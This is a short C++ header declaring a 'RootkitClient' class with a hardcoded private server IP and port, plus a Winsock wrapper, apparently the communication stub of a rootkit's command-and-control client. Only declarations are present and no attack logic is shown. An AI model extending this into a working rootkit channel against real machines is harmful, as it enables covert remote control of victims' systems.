#pragma once
#include "common.h"

namespace Network {
	constexpr unsigned short SERVER_PORT = 9001;
	constexpr unsigned int MAX_PACKET_SIZE = 1024;
	constexpr char SERVER_IP[] = "10.0.0.9";

	class WrapWSA {
	public:
		WrapWSA();
		void cleanup();
		int getError();
	};

	class RootkitClient {
	private:
		WrapWSA m_wsa;
		unsigned short m_port;
		SOCKET m_server_socket;
		bool connect_to_server();
	public:
		RootkitClient();
		~RootkitClient();
		bool SendText(std::string text);
		bool ReceiveText(std::string& text);
	};

}
